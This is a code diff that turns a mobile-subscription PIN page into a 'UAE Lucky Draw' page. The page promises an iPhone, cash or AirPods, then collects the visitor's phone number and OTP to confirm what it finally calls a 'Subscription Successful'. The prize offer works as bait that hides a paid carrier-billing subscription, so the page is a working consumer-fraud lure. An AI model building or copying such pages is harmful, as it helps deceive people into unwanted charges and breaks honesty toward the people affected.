@@ -1,39 +1,255 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>MVAS PIN FLOW</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+<title>Lucky Draw UAE</title>
+
+<style>
+
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:Arial;
+}
+
+body{
+
+  background:#0f172a;
+  color:white;
+  overflow-x:hidden;
+
+}
+
+.container{
+
+  width:100%;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+
+}
+
+.logo{
+
+  font-size:40px;
+  font-weight:bold;
+  color:#FFD700;
+  margin-bottom:20px;
+
+}
+
+.subtitle{
+
+  font-size:20px;
+  text-align:center;
+  margin-bottom:30px;
+  line-height:1.5;
+
+}
+
+.gift-box{
+
+  width:220px;
+  animation:float 2s infinite ease-in-out;
+
+}
+
+@keyframes float{
+
+  0%{
+    transform:translateY(0px);
+  }
+
+  50%{
+    transform:translateY(-15px);
+  }
+
+  100%{
+    transform:translateY(0px);
+  }
+
+}
+
+.prizes{
+
+  margin-top:30px;
+  display:flex;
+  gap:15px;
+  flex-wrap:wrap;
+  justify-content:center;
+
+}
+
+.prize{
+
+  background:#1e293b;
+  border:2px solid #FFD700;
+  padding:15px;
+  border-radius:12px;
+  width:110px;
+  text-align:center;
+  font-weight:bold;
+
+}
+
+.claim-box{
+
+  margin-top:35px;
+  width:100%;
+  max-width:350px;
+
+}
+
+input{
+
+  width:100%;
+  padding:15px;
+  border:none;
+  border-radius:10px;
+  margin-bottom:15px;
+  font-size:16px;
+
+}
+
+button{
+
+  width:100%;
+  padding:15px;
+  border:none;
+  border-radius:10px;
+  background:#FFD700;
+  color:black;
+  font-size:18px;
+  font-weight:bold;
+  cursor:pointer;
+
+}
+
+button:hover{
+
+  opacity:0.9;
+
+}
+
+#otpBox{
+
+  display:none;
+  margin-top:20px;
+
+}
+
+.loading{
+
+  display:none;
+  margin-top:15px;
+  text-align:center;
+  color:#FFD700;
+
+}
+
+.success{
+
+  display:none;
+  margin-top:20px;
+  text-align:center;
+  color:#00ff88;
+  font-size:22px;
+  font-weight:bold;
+
+}
+
+.footer{
+
+  margin-top:40px;
+  font-size:12px;
+  color:#94a3b8;
+  text-align:center;
+
+}
+
+</style>
+
 </head>
 
 <body>
 
-  <h1>Watch Premium Videos</h1>
+<div class="container">
 
-  <!-- phone input -->
-  <input
-    id="msisdn"
-    placeholder="Enter Phone Number"
+  <div class="logo">
+    UAE Lucky Draw
+  </div>
+
+  <div class="subtitle">
+    Win iPhone 16 Pro Max,<br>
+    AED 10,000 Cash or AirPods Pro!
+  </div>
+
+  <img
+    class="gift-box"
+    src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png"
   >
 
-  <button onclick="sendPIN()">
-    Continue
-  </button>
+  <div class="prizes">
 
-  <!-- otp box -->
-  <div
-    id="otpBox"
-    style="display:none; margin-top:20px;"
-  >
+    <div class="prize">
+      iPhone 16
+    </div>
 
-    <input
-      id="otp"
-      placeholder="Enter OTP"
-    >
+    <div class="prize">
+      AED 10K
+    </div>
 
-    <button onclick="verifyOTP()">
-      Verify OTP
-    </button>
+    <div class="prize">
+      AirPods
+    </div>
 
   </div>
+
+  <div class="claim-box">
+
+    <input
+      id="msisdn"
+      placeholder="Enter Mobile Number"
+    >
+
+    <button onclick="sendPIN()">
+      Claim Now
+    </button>
+
+    <div class="loading" id="loading">
+      Processing...
+    </div>
+
+    <div id="otpBox">
+
+      <input
+        id="otp"
+        placeholder="Enter OTP"
+      >
+
+      <button onclick="verifyOTP()">
+        Verify OTP
+      </button>
+
+    </div>
+
+    <div class="success" id="success">
+      Subscription Successful!
+    </div>
+
+  </div>
+
+  <div class="footer">
+    Terms & Conditions Apply
+  </div>
+
+</div>
 
 <script>
 
@@ -45,31 +261,47 @@ async function sendPIN(){
   const msisdn =
     document.getElementById('msisdn').value;
 
-  const response = await fetch('/api/send-pin',{
-
-    method:'POST',
-
-    headers:{
-      'Content-Type':'application/json'
-    },
-
-    body:JSON.stringify({
-      msisdn:msisdn
-    })
-
-  });
-
-  const data = await response.json();
-
-  console.log(data);
-
-  // save txid
-  currentTxid = data.txid;
-
-  // show otp box
   document
-    .getElementById('otpBox')
+    .getElementById('loading')
     .style.display = 'block';
+
+  try{
+
+    const response = await fetch('/api/send-pin',{
+
+      method:'POST',
+
+      headers:{
+        'Content-Type':'application/json'
+      },
+
+      body:JSON.stringify({
+        msisdn:msisdn
+      })
+
+    });
+
+    const data = await response.json();
+
+    console.log(data);
+
+    currentTxid = data.txid;
+
+    document
+      .getElementById('loading')
+      .style.display = 'none';
+
+    document
+      .getElementById('otpBox')
+      .style.display = 'block';
+
+  } catch(err){
+
+    console.log(err);
+
+    alert("System Error");
+
+  }
 
 }
 
@@ -80,35 +312,51 @@ async function verifyOTP(){
   const otp =
     document.getElementById('otp').value;
 
-  const response = await fetch('/api/verify-pin',{
+  try{
 
-    method:'POST',
+    const response = await fetch('/api/verify-pin',{
 
-    headers:{
-      'Content-Type':'application/json'
-    },
+      method:'POST',
 
-    body:JSON.stringify({
+      headers:{
+        'Content-Type':'application/json'
+      },
 
-      txid:currentTxid,
+      body:JSON.stringify({
 
-      pin:otp
+        txid:currentTxid,
 
-    })
+        pin:otp
 
-  });
+      })
 
-  const data = await response.json();
+    });
 
-  console.log(data);
+    const data = await response.json();
 
-  if(data.success){
+    console.log(data);
 
-    alert("Subscription Success");
+    if(data.success){
 
-  } else {
+      document
+        .getElementById('success')
+        .style.display = 'block';
 
-    alert("Wrong OTP");
+      document
+        .getElementById('otpBox')
+        .style.display = 'none';
+
+    } else {
+
+      alert("Invalid OTP");
+
+    }
+
+  } catch(err){
+
+    console.log(err);
+
+    alert("Verification Failed");
 
   }
 
